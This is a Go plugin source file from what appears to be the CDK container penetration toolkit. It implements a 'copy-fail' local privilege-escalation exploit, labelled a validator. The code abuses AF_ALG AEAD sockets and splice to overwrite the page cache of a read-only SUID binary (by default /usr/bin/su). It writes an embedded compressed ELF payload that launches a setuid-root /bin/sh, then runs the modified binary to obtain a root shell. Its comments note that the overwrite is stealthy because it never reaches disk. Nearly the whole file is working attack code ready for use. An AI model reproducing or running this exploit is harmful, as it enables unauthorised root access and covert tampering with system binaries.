//go:build linux
// +build linux

/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package privilege_escalation

// CAP-2026-001 copy-fail 本地提权边界验证
//
// IMPORTANT: This validator performs LOCAL PRIVILEGE ESCALATION only (non-root → root
// inside the container).  It does NOT escape the container or affect the host.
// You must already have a non-root shell inside the container to use it.
//
// The validator abuses a bug in the interaction between AF_ALG AEAD sockets and
// the splice/pipe subsystem.  By sending a payload via sendmsg(MSG_MORE) and
// then splicing read-only file pages into the same socket's pipe buffers, the
// kernel writes attacker-controlled data back into those (nominally read-only)
// page-cache pages.  The modified pages are never written to disk, making the
// overwrite stealthy.
//
// Usage: ./cdk run copy-fail-validator [/usr/bin/su]

import (
	"bytes"
	"compress/zlib"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"github.com/cdk-team/CDK/pkg/audit/base"
	"github.com/cdk-team/CDK/pkg/cli"
	"github.com/cdk-team/CDK/pkg/plugin"
	"golang.org/x/sys/unix"
)

// copyFailPayloadHex is the original zlib-compressed x86_64 ELF payload used
// by the reference Python PoC. It replaces the target SUID binary's page cache
// with a tiny setuid-root launcher that eventually executes `/bin/sh`.
const copyFailPayloadHex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"

// copyFailDecompressPayload decompresses the embedded zlib payload.
func copyFailDecompressPayload() ([]byte, error) {
	compressed, err := hex.DecodeString(copyFailPayloadHex)
	if err != nil {
		return nil, fmt.Errorf("hex decode: %v", err)
	}
	r, err := zlib.NewReader(bytes.NewReader(compressed))
	if err != nil {
		return nil, fmt.Errorf("zlib reader: %v", err)
	}
	defer r.Close()
	var buf bytes.Buffer
	if _, err = buf.ReadFrom(r); err != nil {
		return nil, fmt.Errorf("zlib read: %v", err)
	}
	return buf.Bytes(), nil
}

// buildAlgCmsg constructs a single ancillary-data (cmsghdr + data) record for
// use as the oob buffer passed to sendmsg.  The returned slice is padded to the
// natural alignment expected by the kernel.
func buildAlgCmsg(level, typ int32, data []byte) []byte {
	space := syscall.CmsgSpace(len(data))
	buf := make([]byte, space)
	hdr := (*syscall.Cmsghdr)(unsafe.Pointer(&buf[0]))
	hdr.SetLen(syscall.CmsgLen(len(data)))
	hdr.Level = level
	hdr.Type = typ
	copy(buf[syscall.SizeofCmsghdr:], data)
	return buf
}

// acceptAlgOpFd accepts the operation socket from an AF_ALG listener. Unlike
// the generic unix.Accept helper, AF_ALG expects addr/addrlen to be NULL.
func acceptAlgOpFd(algFd int) (int, error) {
	fd, _, errno := unix.Syscall6(
		unix.SYS_ACCEPT4,
		uintptr(algFd),
		0,
		0,
		uintptr(unix.SOCK_CLOEXEC),
		0,
		0,
	)
	if errno != 0 {
		return 0, errno
	}
	return int(fd), nil
}

// copyFailWriteChunk uses an AF_ALG AEAD socket together with splice to write
// exactly four bytes of chunk into the page cache of the file identified by fd
// at the given byte offset.
func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
	// Create the AF_ALG socket and bind to the AEAD algorithm.
	algFd, err := unix.Socket(unix.AF_ALG, unix.SOCK_SEQPACKET, 0)
	if err != nil {
		return fmt.Errorf("socket: %v", err)
	}
	defer unix.Close(algFd)

	sa := &unix.SockaddrALG{
		Type: "aead",
		Name: "authencesn(hmac(sha256),cbc(aes))",
	}
	if err = unix.Bind(algFd, sa); err != nil {
		return fmt.Errorf("bind: %v", err)
	}

	// ALG_SET_KEY: 8-byte RTA header (rta_len=8, rta_type=1, enc_key_len=16)
	// followed by a 16-byte AES-128 key and a 16-byte HMAC key (all zeros).
	key := make([]byte, 40)
	key[0] = 0x08 // rta_len (little-endian low byte)
	key[2] = 0x01 // rta_type = CRYPTO_AUTHENC_KEYA_PARAM
	key[7] = 0x10 // enc key length = 16 (big-endian in the RTA payload)
	if _, _, errno := unix.Syscall6(
		unix.SYS_SETSOCKOPT,
		uintptr(algFd),
		uintptr(unix.SOL_ALG),
		uintptr(unix.ALG_SET_KEY),
		uintptr(unsafe.Pointer(&key[0])),
		uintptr(len(key)),
		0,
	); errno != 0 {
		return fmt.Errorf("setsockopt ALG_SET_KEY: %v", errno)
	}

	// ALG_SET_AEAD_AUTHSIZE: pass a NULL optval with optlen = auth-tag size (4).
	if _, _, errno := unix.Syscall6(
		unix.SYS_SETSOCKOPT,
		uintptr(algFd),
		uintptr(unix.SOL_ALG),
		uintptr(unix.ALG_SET_AEAD_AUTHSIZE),
		0,
		4,
		0,
	); errno != 0 {
		return fmt.Errorf("setsockopt ALG_SET_AEAD_AUTHSIZE: %v", errno)
	}

	// Accept returns the operation socket used for actual encrypt/decrypt calls.
	// AF_ALG sockets expect accept4(..., NULL, NULL, SOCK_CLOEXEC).
	opFd, err := acceptAlgOpFd(algFd)
	if err != nil {
		return fmt.Errorf("accept: %v", err)
	}
	defer unix.Close(opFd)

	// count = offset + 4 — total bytes to splice from the target file.
	count := offset + 4

	// Build the three control messages that accompany the sendmsg call:
	//   ALG_SET_OP     – operation: DECRYPT (0), 4-byte value
	//   ALG_SET_IV     – IV length field (0x10 = 16) + 19 zero bytes
	//   ALG_SET_AEAD_ASSOCLEN – associated-data length = 8, 4-byte value
	opData := make([]byte, 4) // op = DECRYPT = 0
	ivData := make([]byte, 20)
	ivData[0] = 0x10 // IV length = 16
	assocData := make([]byte, 4)
	assocData[0] = 0x08 // assoc length = 8

	oob := buildAlgCmsg(unix.SOL_ALG, unix.ALG_SET_OP, opData)
	oob = append(oob, buildAlgCmsg(unix.SOL_ALG, unix.ALG_SET_IV, ivData)...)
	oob = append(oob, buildAlgCmsg(unix.SOL_ALG, unix.ALG_SET_AEAD_ASSOCLEN, assocData)...)

	// sendmsg with MSG_MORE: queue 4 bytes of assoc data ("AAAA") and the
	// 4-byte payload chunk.  MSG_MORE signals that more data will follow via
	// splice, deferring ALG processing until the pipe data arrives.
	msgData := append([]byte("AAAA"), chunk...)
	if _, err = unix.SendmsgN(opFd, msgData, oob, nil, unix.MSG_MORE); err != nil {
		return fmt.Errorf("sendmsg: %v", err)
	}

	// Create a pipe to bridge the target file and the ALG operation socket.
	var pipeFds [2]int
	if err = unix.Pipe(pipeFds[:]); err != nil {
		return fmt.Errorf("pipe: %v", err)
	}
	pipeR, pipeW := pipeFds[0], pipeFds[1]
	defer unix.Close(pipeR)
	defer unix.Close(pipeW)

	// splice(targetFd, offset_src=0, pipeW, nil, count, 0)
	// Read 'count' bytes from offset 0 of the target file into the pipe,
	// linking the file's page-cache pages to the pipe buffers.
	var offsetSrc int64 = 0
	if _, err = unix.Splice(fd, &offsetSrc, pipeW, nil, count, 0); err != nil {
		return fmt.Errorf("splice(file->pipe): %v", err)
	}

	// splice(pipeR, nil, opFd, nil, count, 0)
	// Deliver the pipe data to the ALG socket, triggering the kernel bug that
	// overwrites the page-cache pages with the attacker-controlled data.
	if _, err = unix.Splice(pipeR, nil, opFd, nil, count, 0); err != nil {
		return fmt.Errorf("splice(pipe->alg): %v", err)
	}

	// Drain any ALG output; errors are intentionally ignored (mirrors the
	// original Python: `try: u.recv(8+t) except: 0`).
	recvBuf := make([]byte, 8+offset)
	unix.Read(opFd, recvBuf) //nolint:errcheck

	return nil
}

// CopyFailExploit is the main entry point.  It decompresses the embedded
// payload, overwrites the page cache of targetBin four bytes at a time using
// the CAP-2026-001 验证流程, then executes the now-modified binary to
// obtain a root shell.
func CopyFailExploit(targetBin string) error {
	payload, err := copyFailDecompressPayload()
	if err != nil {
		return fmt.Errorf("decompress payload: %v", err)
	}

	fd, err := syscall.Open(targetBin, syscall.O_RDONLY, 0)
	if err != nil {
		return fmt.Errorf("open %s: %v", targetBin, err)
	}
	defer syscall.Close(fd)

	log.Printf("[+] Injecting %d bytes into page cache of %s\n", len(payload), targetBin)
	for i := 0; i+4 <= len(payload); i += 4 {
		if err := copyFailWriteChunk(fd, i, payload[i:i+4]); err != nil {
			return fmt.Errorf("write chunk at offset %d: %v", i, err)
		}
	}

	log.Println("[+] Page cache overwrite complete. Executing target binary for root shell...")
	cmd := exec.Command(targetBin)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

// Plugin interface

type copyFailCVE202631431S struct{ base.BaseExploit }

func (p copyFailCVE202631431S) Desc() string {
	return "CAP-2026-001 copy-fail-validator 本地权限边界验证 (non-root → root 可达性)"
}

func (p copyFailCVE202631431S) Run() bool {
	args := cli.Args["<args>"].([]string)

	targetBin := "/usr/bin/su"
	if len(args) >= 1 {
		targetBin = args[0]
	}

	log.Printf("[*] CAP-2026-001 copy-fail-validator 目标: %s\n", targetBin)
	log.Println("[*] NOTE: This check performs local privilege escalation (non-root → root) inside the container only. It does NOT escape the container.")
	if err := CopyFailExploit(targetBin); err != nil {
		log.Printf("[-] Check failed: %v\n", err)
		return false
	}
	return true
}

func init() {
	exploit := copyFailCVE202631431S{}
	exploit.ExploitType = "privilege-escalation"
	exploit.ActivePrereqs = []string{"InContainer"}
	plugin.RegisterExploit("copy-fail-validator", exploit)
}
